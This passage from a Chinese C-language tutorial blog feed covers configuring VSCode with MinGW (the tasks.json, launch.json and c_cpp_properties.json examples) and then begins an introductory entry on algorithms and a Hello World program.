id="安装汉化插件">安装汉化插件</h3><p>如前所述,VSCode的各种功能依赖强大的插件,中文汉化也是如此,左侧栏点击<code>扩展管理</code>,搜索&quot;chinese&quot;:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240323203317445.png" alt="image-20240323203317445" style="zoom:50%;" /><p>点击第一个扩展,右侧安装,然后<code>重启VSCode</code>即可:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240323203426637.png" alt="image-20240323203426637" style="zoom:50%;" /><h3 id="c-c-的配置">C/C++的配置</h3><p>配置主要包含3个部分:语言支持(语法检测与智能提示),编译支持,运行支持.</p><p>注:未包含CMake的配置~~,VSCode的CMake插件这玩意有点抽象…~~</p><h4 id="语言支持">语言支持</h4><p>安装C/C++语言支持插件即可,同时集成了文件支持,语法检测和智能提示:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240323204222195.png" alt="image-20240323204222195" style="zoom:50%;" /><p>另外该扩展还提供了C/C++的调试支持,当然只是提供了调试的功能,并没有携带<code>编译器</code>和<code>调试器</code>,我们需要自己安装.</p><h4 id="编译支持">编译支持</h4><p>在进行此步之前,请确保你的电脑上安装有C/C++编译工具链,例如<code>MinGW-w64</code>,如未安装,请向上翻页,安装之.</p><p>另外,如果你的电脑有安装VS系列IDE,那么恭喜你,你拥有了<code>msvc(cl)</code>编译器,你完全可以使用它来配置你的VSCode运行环境,但是本文使用<code>MinGW</code>.</p><p>我们安装了MinGW之后,就可以针对每一个工作目录(是的,每一个工作目录都需要,因此可以把接下来的<code>.vscode</code>放在比较靠上(外)的一个总目录中)进行编译运行的配置.</p><br><p>我们假设你已经安装好了<code>MinGW</code>工具链(或clang,msvc的任何一种),接下来进行<code>编译任务</code>的配置.</p><p>VSCode在每个工作根目录下生成一个特殊的<code>.vscode</code>文件夹,里面会存放一些<code>.json</code>文件,其中就是各个配置文件.</p><p>VSCode将编译过程作为各个任务(task),写在<code>.vscode</code>里的<code>tasks.json</code>配置文件中,我们在打开一个文件夹后,ctrl+f5,上方会弹出一个提示框,提示你选择编译任务,我们可以直接选择自己的编译器(例如mingw的gcc),来让vscode自动生成编译任务:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240323211847289.png" alt="image-20240323211847289" style="zoom:50%;" /><p>然后这里我选择我本地的MinGW工具链:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240323211912931.png" alt="image-20240323211912931"></p><p>这样VSCode就会自动为你生成好<code>task.json</code>:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240323212020626.png" alt="image-20240323212020626" style="zoom:50%;" /><p>这里其实就可以编译运行了,但是不够灵活,我们可以自己进行配置,例如设置2个<code>任务</code>,分别编译C和C++,甚至我们可以加入python调试运行的任务.</p><p>这里我贴上我的<code>tasks.json</code>内容,各位自己将路径(gcc,g++,gdb等)进行修改:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;version&quot;</span>: <span class="string">&quot;2.0.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;tasks&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;type&quot;</span>: <span class="string">&quot;cppbuild&quot;</span>,</span><br><span class="line">            <span class="string">&quot;label&quot;</span>: <span class="string">&quot;C++ Build&quot;</span>,</span><br><span class="line">            <span class="string">&quot;command&quot;</span>: <span class="string">&quot;Your/path/to/mingw64/bin/g++.exe&quot;</span>,</span><br><span class="line">            <span class="string">&quot;args&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;-fdiagnostics-color=always&quot;</span>,</span><br><span class="line">                <span class="string">&quot;-g&quot;</span>,</span><br><span class="line">                <span class="string">&quot;$&#123;file&#125;&quot;</span>,</span><br><span class="line">                <span class="string">&quot;-std=c++11&quot;</span>,</span><br><span class="line">                <span class="string">&quot;-o&quot;</span>,</span><br><span class="line">                <span class="string">&quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.exe&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;options&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;cwd&quot;</span>: <span class="string">&quot;Your/path/to/mingw64/bin&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;problemMatcher&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;$gcc&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;group&quot;</span>: <span class="string">&quot;build&quot;</span>,</span><br><span class="line">            <span class="comment">// &quot;detail&quot;: &quot;使用 g++ 进行c++单个文件的编译&quot;</span></span><br><span class="line">            <span class="string">&quot;detail&quot;</span>: <span class="string">&quot;C++单文件编译&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;type&quot;</span>: <span class="string">&quot;cppbuild&quot;</span>,</span><br><span class="line">            <span class="string">&quot;label&quot;</span>: <span class="string">&quot;C Build&quot;</span>,</span><br><span class="line">            <span class="string">&quot;command&quot;</span>: <span class="string">&quot;Your/path/to/mingw64/bin/gcc.exe&quot;</span>,</span><br><span class="line">            <span class="string">&quot;args&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;-fdiagnostics-color=always&quot;</span>,</span><br><span class="line">                <span class="string">&quot;-g&quot;</span>,</span><br><span class="line">                <span class="string">&quot;$&#123;file&#125;&quot;</span>,</span><br><span class="line">                <span class="string">&quot;-std=c11&quot;</span>,</span><br><span class="line">                <span class="string">&quot;-o&quot;</span>,</span><br><span class="line">                <span class="string">&quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.exe&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;options&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;cwd&quot;</span>: <span class="string">&quot;Your/path/to/mingw64/bin&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;problemMatcher&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;$gcc&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;group&quot;</span>: <span class="string">&quot;build&quot;</span>,</span><br><span class="line">            <span class="comment">// &quot;detail&quot;: &quot;使用 gcc 进行c语言单个文件的编译&quot;</span></span><br><span class="line">            <span class="string">&quot;detail&quot;</span>: <span class="string">&quot;C语言单文件编译&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;type&quot;</span>: <span class="string">&quot;cppbuild&quot;</span>,</span><br><span class="line">            <span class="string">&quot;label&quot;</span>: <span class="string">&quot;c/c++ debug&quot;</span>,</span><br><span class="line">            <span class="string">&quot;command&quot;</span>: <span class="string">&quot;Your/path/to/mingw64/bin/g++.exe&quot;</span>,</span><br><span class="line">            <span class="string">&quot;args&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;-fdiagnostics-color=always&quot;</span>,</span><br><span class="line">                <span class="string">&quot;-g&quot;</span>,</span><br><span class="line">                <span class="string">&quot;$&#123;file&#125;&quot;</span>,</span><br><span class="line">                <span class="string">&quot;-o&quot;</span>,</span><br><span class="line">                <span class="string">&quot;$&#123;fileDirname&#125;\\$&#123;fileBasenameNoExtension&#125;.exe&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;options&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;cwd&quot;</span>: <span class="string">&quot;Your/path/to/mingw64/bin&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;problemMatcher&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;$gcc&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;group&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;kind&quot;</span>: <span class="string">&quot;build&quot;</span>,</span><br><span class="line">                <span class="string">&quot;isDefault&quot;</span>: <span class="literal">true</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;detail&quot;</span>: <span class="string">&quot;调试器生成的任务&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们就可以进行task的选择,使用<code>ctrl+p</code>打开命令提示框,输入<code>&gt;task</code>,点击第一个<code>运行任务</code>:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240323212816525.png" alt="image-20240323212816525" style="zoom:50%;" /><p>然后选择自己的任务:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240323212907586.png" alt="image-20240323212907586" style="zoom:50%;" /><p>即可执行编译任务:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240323213612972.png" alt="image-20240323213612972" style="zoom:50%;" /><p>当然这只是编译,不过运行也简单,<code>Ctrl+F5</code>就会弹出窗口,再次选择你的<code>编译任务</code>即可,VScode会自动编译,然后进行调试/运行.</p><p>此外,<code>task.json</code>的每个任务都是独立的,我们后面会在<code>launch.json</code>中调用编译任务.</p><h4 id="运行支持">运行支持</h4><p>接下来就是配置启动任务,即运行程序,运行任务依赖于编译任务.</p><p>这些内容放在<code>launch.json</code>中,我把我的运行配置放在这里:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;version&quot;</span>: <span class="string">&quot;0.2.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;configurations&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// &quot;name&quot;: &quot;C/C++: gcc.exe 生成和调试活动文件&quot;,</span></span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;C/C++: gcc.exe 构建C程序&quot;</span>,</span><br><span class="line">            <span class="string">&quot;type&quot;</span>: <span class="string">&quot;cppdbg&quot;</span>,</span><br><span class="line">            <span class="string">&quot;request&quot;</span>: <span class="string">&quot;launch&quot;</span>,</span><br><span class="line">            <span class="string">&quot;program&quot;</span>: <span class="string">&quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.exe&quot;</span>,</span><br><span class="line">            <span class="string">&quot;args&quot;</span>: [],</span><br><span class="line">            <span class="string">&quot;stopAtEntry&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&quot;cwd&quot;</span>: <span class="string">&quot;E:/devtools/x86_64-12.2.0-release-win32-seh-ucrt-rt_v10-rev2/mingw64/bin&quot;</span>,</span><br><span class="line">            <span class="string">&quot;environment&quot;</span>: [],</span><br><span class="line">            <span class="string">&quot;externalConsole&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&quot;MIMode&quot;</span>: <span class="string">&quot;gdb&quot;</span>,</span><br><span class="line">            <span class="string">&quot;miDebuggerPath&quot;</span>: <span class="string">&quot;E:\\devtools\\x86_64-12.2.0-release-win32-seh-ucrt-rt_v10-rev2\\mingw64\\bin\\gdb.exe&quot;</span>,</span><br><span class="line">            <span class="string">&quot;setupCommands&quot;</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;description&quot;</span>: <span class="string">&quot;为 gdb 启用整齐打印&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;text&quot;</span>: <span class="string">&quot;-enable-pretty-printing&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;ignoreFailures&quot;</span>: <span class="literal">true</span></span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;description&quot;</span>: <span class="string">&quot;将反汇编风格设置为 Intel&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;text&quot;</span>: <span class="string">&quot;-gdb-set disassembly-flavor intel&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;ignoreFailures&quot;</span>: <span class="literal">true</span></span><br><span class="line">                &#125;</span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;preLaunchTask&quot;</span>: <span class="string">&quot;C Build&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// &quot;name&quot;: &quot;C/C++: gcc.exe 生成和调试活动文件&quot;,</span></span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;C/C++: g++.exe 构建C++程序&quot;</span>,</span><br><span class="line">            <span class="string">&quot;type&quot;</span>: <span class="string">&quot;cppdbg&quot;</span>,</span><br><span class="line">            <span class="string">&quot;request&quot;</span>: <span class="string">&quot;launch&quot;</span>,</span><br><span class="line">            <span class="string">&quot;program&quot;</span>: <span class="string">&quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.exe&quot;</span>,</span><br><span class="line">            <span class="string">&quot;args&quot;</span>: [],</span><br><span class="line">            <span class="string">&quot;stopAtEntry&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&quot;cwd&quot;</span>: <span class="string">&quot;E:/devtools/x86_64-12.2.0-release-win32-seh-ucrt-rt_v10-rev2/mingw64/bin&quot;</span>,</span><br><span class="line">            <span class="string">&quot;environment&quot;</span>: [],</span><br><span class="line">            <span class="string">&quot;externalConsole&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&quot;MIMode&quot;</span>: <span class="string">&quot;gdb&quot;</span>,</span><br><span class="line">            <span class="string">&quot;miDebuggerPath&quot;</span>: <span class="string">&quot;E:\\devtools\\x86_64-12.2.0-release-win32-seh-ucrt-rt_v10-rev2\\mingw64\\bin\\gdb.exe&quot;</span>,</span><br><span class="line">            <span class="string">&quot;setupCommands&quot;</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;description&quot;</span>: <span class="string">&quot;为 gdb 启用整齐打印&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;text&quot;</span>: <span class="string">&quot;-enable-pretty-printing&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;ignoreFailures&quot;</span>: <span class="literal">true</span></span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;description&quot;</span>: <span class="string">&quot;将反汇编风格设置为 Intel&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;text&quot;</span>: <span class="string">&quot;-gdb-set disassembly-flavor intel&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;ignoreFailures&quot;</span>: <span class="literal">true</span></span><br><span class="line">                &#125;</span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;preLaunchTask&quot;</span>: <span class="string">&quot;C++ Build&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;C/C++ debug&quot;</span>,</span><br><span class="line">            <span class="string">&quot;type&quot;</span>: <span class="string">&quot;cppdbg&quot;</span>,</span><br><span class="line">            <span class="string">&quot;request&quot;</span>: <span class="string">&quot;launch&quot;</span>,</span><br><span class="line">            <span class="string">&quot;program&quot;</span>: <span class="string">&quot;$&#123;fileDirname&#125;//$&#123;fileBasenameNoExtension&#125;.exe&quot;</span>,</span><br><span class="line">            <span class="string">&quot;args&quot;</span>: [],</span><br><span class="line">            <span class="string">&quot;stopAtEntry&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&quot;cwd&quot;</span>: <span class="string">&quot;$&#123;fileDirname&#125;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;environment&quot;</span>: [],</span><br><span class="line">            <span class="string">&quot;externalConsole&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&quot;MIMode&quot;</span>: <span class="string">&quot;gdb&quot;</span>,</span><br><span class="line">            <span class="string">&quot;miDebuggerPath&quot;</span>: <span class="string">&quot;E:/devtools/x86_64-12.2.0-release-win32-seh-ucrt-rt_v10-rev2/mingw64/bin/gdb.exe&quot;</span>,</span><br><span class="line">            <span class="string">&quot;setupCommands&quot;</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;description&quot;</span>: <span class="string">&quot;为 gdb 启用整齐打印&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;text&quot;</span>: <span class="string">&quot;-enable-pretty-printing&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;ignoreFailures&quot;</span>: <span class="literal">true</span></span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;description&quot;</span>: <span class="string">&quot;将反汇编风格设置为 Intel&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;text&quot;</span>: <span class="string">&quot;-gdb-set disassembly-flavor intel&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;ignoreFailures&quot;</span>: <span class="literal">true</span></span><br><span class="line">                &#125;</span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;preLaunchTask&quot;</span>: <span class="string">&quot;c/c++ debug&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意其中的<code>&quot;preLaunchTask&quot;</code>的字段,它标注了该启动配置的依赖任务,即想要启动该配置,需要先运行<code>task.json</code>中对应的任务.</p><br><p>至此,即可正常进行编译运行,例如在左下角选择自己需要的任务:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240323215533560.png" alt="image-20240323215533560" style="zoom:50%;" /><p>下面会自动启动一个终端进行输出:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240323220208699.png" alt="image-20240323220208699" style="zoom:50%;" /><h4 id="其他配置">其他配置</h4><p>为了让VSCode能够识别到C/C++头文件等信息,需要在<code>c_cpp_properties.json</code>中设置一些参数信息,这里是我的配置信息:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;configurations&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Win32&quot;</span>, </span><br><span class="line">            <span class="string">&quot;includePath&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;$&#123;workspaceFolder&#125;/**&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;defines&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;_DEBUG&quot;</span>,</span><br><span class="line">                <span class="string">&quot;UNICODE&quot;</span>,</span><br><span class="line">                <span class="string">&quot;_UNICODE&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;windowsSdkVersion&quot;</span>: <span class="string">&quot;10.0.19041.0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;compilerPath&quot;</span>: <span class="string">&quot;Your/path/to/mingw64/bin/g++.exe&quot;</span>,</span><br><span class="line">            <span class="string">&quot;cStandard&quot;</span>: <span class="string">&quot;c17&quot;</span>,</span><br><span class="line">            <span class="string">&quot;cppStandard&quot;</span>: <span class="string">&quot;c++17&quot;</span>,</span><br><span class="line">            <span class="string">&quot;intelliSenseMode&quot;</span>: <span class="string">&quot;windows-gcc-x64&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;version&quot;</span>: <span class="number">4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样头文件就不会报红波浪线了.</p><h1 id="macos和linux">MacOS和Linux</h1><h2 id="linux">Linux</h2><p>由于Linux的发展历史,Linux这种&quot;类UNIX&quot;操作系统对C语言高度支持!</p><p>所以,几乎所有的Linux发行版都默认安装有C语言的编译器(一般都是gcc).</p><p>Linux,使用终端手动调用gcc进行编译,可以装一个文本编辑器来使用,例如Sublimetext4.或者,Clion和VSCode也有Linux平台的支持.</p><h2 id="macos">MacOS</h2><p>至于MacOS,我没用过,所以没法写教程,大多可能使用VSCode或Xcode.</p><p align=right>---WAHAHA,2023.11.07 修改</p><br><br><p>上一篇:<a href="../20234deceb66e98f/">c语言教程-1_2-关键概念</a></p><p>下一篇:<a href="../2023949602bbfb8e/">c语言教程-3_1-数据类型</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-1_1-什么是程序</title>
      <link href="/2023066a5a37645a/"/>
      <url>/2023066a5a37645a/</url>
      
        <content type="html"><![CDATA[<h1 id="c语言概述">C语言概述</h1><p>首先，关于C语言的发展历史，您应该去书上找到答案，这里省略之。</p><p>如章节<code>1_1</code>所述，C语言是高级语言的一种，但它并不是汇编之后的第一门高级语言，不过其仍然是非常偏向底层的一门语言，例如使用指针直接访问内存等，这让C语言不仅有着高级语言的便捷性，同时又保留了其极高的运行效率；但是运行效率带来的问题就是，它仍然不够抽象，C程序员很多情况下仍然需要注意计算机的运行逻辑对C程序的影响。</p><p>学习C语言时需要注意：</p><ul><li>由于C的抽象度并没有Java、Python等现代语言高，因此在很多方面无法从语言层面提供便利；</li><li>C语言有着一些特殊设计、设计缺陷，许多代码往往隐藏着陷阱，它们的运行效果可能会让人出乎意料，感到迷惑，这一点需要您多加小心；</li><li>不要太过纠结原理，C语言仍然是一门偏底层的语言，初学时一味地探究原理并不是一件好事，这往往会让您浪费掉大量时间。</li></ul><h2 id="算法是什么">算法是什么</h2><p><code>算法</code>是指解决问题的一种方法或一个过程。<br><code>算法</code>是若干指令的<strong>有穷序列</strong>，满足以下性质：</p><ol><li>输入：有外部提供的量作为算法的输入</li><li>输出：算法产生<strong>至少一个量</strong>作为输出—算法必须有结果</li><li>确定性：组成算法的每条指令是<strong>清晰，无歧义</strong>的</li><li>有限性：算法中每条指令的执行次数是<strong>有限的</strong>，执行每条指令的时间也是<strong>有限的</strong></li></ol><p>无论是解决像“计算两个数的最大公因数”这样的简单数学问题，还是“规划一条导航路线”这样复杂的实际问题，都可以找出其解决方案，满足上面的性质，就是一个算法。</p><h2 id="编程语言与算法">编程语言与算法</h2><p>前面说，“编程语言是用于控制计算机执行特定任务的语言”，一般而言，这些特定任务就是各种算法。<br>我们学习C语言，是为了使用这门语言来描述各种算法，让计算机代为劳之。</p><h2 id="c语言的特点">C语言的特点</h2><ol><li>简洁且紧凑。C语言一共只有32个关键字、9种控制语句，代码非常紧凑干练。</li><li>强大的类型系统。C语言的数据类型非常丰富，包括整形、浮点型、字符型、数组类型、指针类型、结构体类型和共用体类型等，进而能够轻松实现各种复杂的数据结构。<br>但是另一方面，C语言的类型系统并不是<code>类型安全</code>的，这与C语言的设计初衷和思想有关。这个问题现在讨论还为时尚早。</li><li>自由且高效。C语言的<code>指针</code>是其灵魂所在，C程序可以自由地访问硬件、操作内存，因此C语言可以写出十分灵活且效率极高的程序，编写对性能有着极高要求的软件（例如操作系统）时有着极大的优势。</li></ol><p>但是C语言的特点在某些程度上，也是其缺点所在，读者越是向后学习，就越能体会的到，这里也并不方便展开讨论。</p><h1 id="c语言程序是什么">C语言程序是什么</h1><h2 id="c代码是怎么样的">C代码是怎么样的</h2><p>我们上一个最简单，最经典的代码—Hello World！程序，作为经典的入门代码。<br>这个代码的效果是：向终端（命令行）输出一个“Hello，World!”字符串。<br>代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">这是一段C风格的注释---这是一个hello world程序</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// 这是一行注释，这种单行注释的写法实际上借鉴于C++</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> <span class="comment">// 包含一个头文件stdio.h，为了使用printf函数</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;<span class="comment">// 这是一个函数，而且是C程序的入口，一切必须从这里开始执行</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello，World!&quot;</span>); <span class="comment">// 一条语句，这条语句的作用是调用printf函数，用于输出一个字符串，这里输出&quot;Hello World!&quot;</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 代表结束main函数，并返回一个0，这里先不用关心其作用，只要记住main函数要加上这条语句即可</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下面将程序拆解为几块来分别进行讲解。</p><h3 id="头文件包含-include-stdio-h">头文件包含#include&lt;stdio.h&gt;</h3><p>作为描述算法的语言，程序的编写就是描述算法的过程。一个完整的算法中会包含许多小操作，这些小操作甚至也是一些子算法，整个算法分为几个不同的步骤去进行，其中一些最基本的不可或缺的操作或者已经开发好的算法就没有必要再去手动重新编写，也就是说别人已经造好了轮子，你先拿来用就行。这种已经写好的代码被称为<code>库</code>。</p><p>C语言也有许多写好的“库”可以直接使用，我们想要使用它们，一般（不是绝对）都要加上库自带（提前写好的）的“导入信息”，C语言中称为<strong>头文件</strong>。实际上，头文件包含了许多函数/自定义类型等元素的声明（后面说明），想要使用某个函数，那么必须让编译器知道我导入了这个函数（事先声明好）。</p><p>例子中的<code>stdio.h</code>就是一个头文件，它是<code>standard in/out</code>的缩写，即<code>标准输入输出</code>，后缀名<code>.h</code>表明这是一个C头文件(header).<br>而<code>#include &lt;header file&gt;</code>则是C代码中导入头文件的语法.</p><h3 